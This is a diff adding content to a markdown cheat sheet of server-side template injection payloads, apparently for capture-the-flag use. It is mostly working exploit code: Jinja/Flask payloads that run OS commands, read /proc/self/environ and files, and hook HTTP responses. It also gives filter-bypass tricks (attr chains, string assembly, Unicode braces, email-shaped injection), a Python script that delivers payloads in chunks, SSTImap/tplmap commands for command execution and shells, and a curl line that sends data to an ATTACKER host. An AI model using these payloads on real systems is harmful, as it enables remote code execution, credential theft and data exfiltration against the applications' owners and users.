@@ -180,6 +180,36 @@ Blind / delayed:
 {{lipsum.__globals__.os.popen('cat /flag.txt | base64 -w0 | xargs -I{} curl http://ATTACKER/{}').read()}}
 ```
 
+Advanced Flask/Jinja tricks:
+
+```jinja
+{{url_for.__globals__['__file__']}}
+{{lipsum.__globals__.__builtins__.open(url_for.__globals__['__file__']).read()}}
+{{lipsum.__globals__.__builtins__.open('/proc/self/environ').read()}}
+{{lipsum.__globals__.__builtins__.open('/proc/self/cmdline').read()}}
+```
+
+Write a config file, load it, then read a command result from `config`:
+
+```jinja
+{{lipsum.__globals__.__builtins__.open('/tmp/x.py','w').write('RUNCMD=__import__("os").popen("id").read()')}}
+{{config.from_pyfile('/tmp/x.py')}}
+{{config['RUNCMD']}}
+```
+
+Change the HTTP response from inside a template:
+
+```jinja
+{{config.__class__.from_envvar.__globals__.__builtins__.exec("from flask import after_this_request\n@after_this_request\ndef hook(resp):\n resp.set_data(open('/flag.txt').read())\n return resp")}}
+```
+
+When output is HTML-escaped:
+
+```jinja
+{{lipsum.__globals__.os.popen('cat /flag.txt').read()|safe}}
+<pre>{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}</pre>
+```
+
 ## Mako / Tornado
 
 Mako:
@@ -364,6 +394,194 @@ Pebble:
 {{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
 ```
 
+## Filtered Contexts
+
+Put blocked words in headers, cookies, or query parameters:
+
+```text
+GET /?x={{PAYLOAD}}&g=__globals__&i=__import__&o=os&c=id HTTP/1.1
+X-G: __globals__
+X-I: __import__
+X-O: os
+X-C: id
+Cookie: g=__globals__; i=__import__; o=os; c=id
+```
+
+```jinja
+{{lipsum|attr(request.args.g)|attr('__getitem__')(request.args.o)|attr('popen')(request.args.c)|attr('read')()}}
+{{lipsum|attr(request.headers['X-G'])|attr('__getitem__')(request.headers['X-O'])|attr('popen')(request.headers['X-C'])|attr('read')()}}
+{{lipsum|attr(request.cookies.g)|attr('__getitem__')(request.cookies.o)|attr('popen')(request.cookies.c)|attr('read')()}}
+```
+
+Build strings without quotes:
+
+```jinja
+{{dict(os=x)|join}}
+{{dict(popen=x)|join}}
+{{dict(read=x)|join}}
+{{dict(class=x)|join}}
+{{dict(globals=x)|join}}
+```
+
+Use `format` to assemble blocked names:
+
+```jinja
+{{request|attr('%s%sclass%s%s'|format('_','_','_','_'))}}
+{{lipsum|attr('%s%sglobals%s%s'|format('_','_','_','_'))}}
+```
+
+Use list and join to assemble blocked names:
+
+```jinja
+{{request|attr(['__','class','__']|join)}}
+{{lipsum|attr(['__','globals','__']|join)}}
+{{lipsum|attr(['__','globals','__']|join)|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+Stage gadgets as variables, then chain them:
+
+```jinja
+{% set s='_' %}
+{% set g=s~s~'globals'~s~s %}
+{% set gi=s~s~'getitem'~s~s %}
+{% set r='read' %}
+{% set p='popen' %}
+{{lipsum|attr(g)|attr(gi)('os')|attr(p)('id')|attr(r)()}}
+```
+
+Same idea using a delimiter and `replace`, useful when `_`, `os`, `popen`, or command words are filtered in different places:
+
+```jinja
+{% set a,b=':',lipsum %}
+{% set c,d=':','__' %}
+{% set e,f=':','globals' %}
+{% set g,h=':','getitem' %}
+{% set i,j=':','popen' %}
+{% set k,l=':','cat /flag.txt' %}
+{% set m,n=':','read' %}
+{{b|attr(':__'|replace(':',d+f))|attr(':__'|replace(':',d+h))(':os'|replace(':',''))|attr(':popen'|replace(':',j))(':cmd'|replace(':',l))|attr(':read'|replace(':',n))()}}
+```
+
+If the app stores each input and renders all messages/usernames later, generate and send chunks from one readable payload. Use `@@CUT@@` for exact split points; if no marker exists, the helper splits by Jinja tags and then by `MAX_LEN`.
+
+```python
+import re
+import requests
+
+URL = "http://HOST"
+SET_PATH = "/set_username"
+TRIGGER_PATH = "/send_message"
+FIELD = "username"
+TRIGGER_FIELD = "message"
+MAX_LEN = 32  # set 0 to only split on @@CUT@@
+CUT = "@@CUT@@"
+
+PAYLOAD = r"""
+{% set a,b=':',lipsum %}@@CUT@@
+{% set c,d=':','@@CUT@@__@@CUT@@' %}@@CUT@@
+{% set e,f=':','glo@@CUT@@bals' %}@@CUT@@
+{% set g,h=':','get@@CUT@@item' %}@@CUT@@
+{% set i,j=':','po@@CUT@@pen' %}@@CUT@@
+{% set k,l=':','cat@@CUT@@ /flag.txt' %}@@CUT@@
+{% set m,n=':','re@@CUT@@ad' %}@@CUT@@
+{{b|attr(':__'|replace(':',d+f))|attr(':__'|replace(':',d+h))(':os'|replace(':',''))|attr(':popen'|replace(':',j))(':cmd'|replace(':',l))|attr(':read'|replace(':',n))()}}
+"""
+
+def clean(s):
+    return "\n".join(line.strip() for line in s.splitlines() if line.strip())
+
+def split_max(s, n):
+    if not n or len(s) <= n:
+        return [s]
+    return [s[i:i+n] for i in range(0, len(s), n)]
+
+def chunks_from_payload(payload):
+    payload = clean(payload)
+    if CUT in payload:
+        return [c for part in payload.split(CUT) for c in split_max(part, MAX_LEN) if c]
+
+    parts = re.findall(r"({%.*?%}|{{.*?}}|{#.*?#}|[^{}]+)", payload, flags=re.S)
+    chunks = []
+    for part in parts:
+        part = part.strip()
+        if part:
+            chunks.extend(split_max(part, MAX_LEN))
+    return chunks
+
+chunks = chunks_from_payload(PAYLOAD)
+for i, chunk in enumerate(chunks):
+    print(f"{i:02d}", repr(chunk))
+
+with requests.Session() as s:
+    for chunk in chunks:
+        s.post(URL + SET_PATH, data={FIELD: chunk})
+        r = s.post(URL + TRIGGER_PATH, data={TRIGGER_FIELD: "x"})
+        print(r.status_code, len(r.text))
+```
+
+This only works when template state or concatenated rendered history preserves earlier chunks before the final expression is evaluated.
+
+When `[` and `]` are blocked:
+
+```jinja
+{{''.__class__.__mro__|last}}
+{{''.__class__.__mro__|last|attr('__subclasses__')()}}
+{{config|attr('__class__')|attr('from_envvar')|attr('__globals__')|attr('__getitem__')('__builtins__')}}
+```
+
+When `.` is blocked:
+
+```jinja
+{{request|attr('application')}}
+{{request|attr('application')|attr('__globals__')}}
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}
+```
+
+When only boolean/error side effects are visible:
+
+```jinja
+{% if lipsum.__globals__.os.popen('cat /flag.txt').read().startswith('flag{') %}YES{% endif %}
+{% if lipsum.__globals__.os.popen('cat /flag.txt').read()[0] == 'f' %}YES{% endif %}
+{{1/(lipsum.__globals__.os.popen('cat /flag.txt').read()[0] == 'f')|int}}
+```
+
+Unicode brace bypass when normalization happens after filtering:
+
+```text
+﹛﹛7*7﹜﹜
+﹛﹛config﹜﹜
+﹛﹛lipsum.__globals__.os.popen('id').read()﹜﹜
+```
+
+RFC5322 email-shaped SSTI:
+
+```text
+"{{7*7}}" <a@b.com>
+"{{config}}" <a@b.com>
+"{{lipsum.__globals__.os.popen('id').read()}}" <a@b.com>
+{{7*7}} <a@b.com>
+a+{{7*7}}@b.com
+a({{7*7}})@b.com
+a@[127.0.0.1]
+"x" ({{7*7}}) <a@b.com>
+```
+
+Use when the app validates an email address but later renders the parsed display name, local part, or comment in a template:
+
+```text
+From: "{{7*7}}" <a@b.com>
+Reply-To: "{{7*7}}" <a@b.com>
+Contact: "x{% print 7*7 %}" <a@b.com>
+```
+
+If quotes are stripped, try comment/local-part forms:
+
+```text
+a({{config}})@b.com
+a+{{config}}@b.com
+"x{{config}}"@b.com
+```
+
 ## Node Templates
 
 EJS:
@@ -432,7 +650,7 @@ If braces are filtered before Unicode normalization:
 ﹛﹛ .Ctx.Response.SendFile "/flag.txt" ﹜﹜
 ```
 
-## CTF Patterns
+## Extra Payloads
 
 Flask flag in config:
 
@@ -494,10 +712,14 @@ Odd code-context gadget from the old sheet:
 
 ## Tools
 
+SSTImap is the maintained Python 3 successor/spin-off of tplmap. Use it to identify the template engine and quickly check whether the injection supports OS command execution, file read/write, template-code execution, blind extraction, or shell modes. It is useful after manual confirmation, but it is noisy.
+
 ```bash
 # SSTImap
 python3 sstimap.py -u 'http://HOST/page?name=INJECT' -s
 python3 sstimap.py -i -u 'http://HOST/page?name=INJECT*' -l 5
+python3 sstimap.py -u 'http://HOST/page?name=INJECT' --os-cmd id
+python3 sstimap.py -u 'http://HOST/page?name=INJECT' --download /flag.txt flag.txt
 
 # tplmap, old but still useful in CTF boxes
 python2.7 tplmap.py -u 'http://HOST/page?name=*' --os-shell
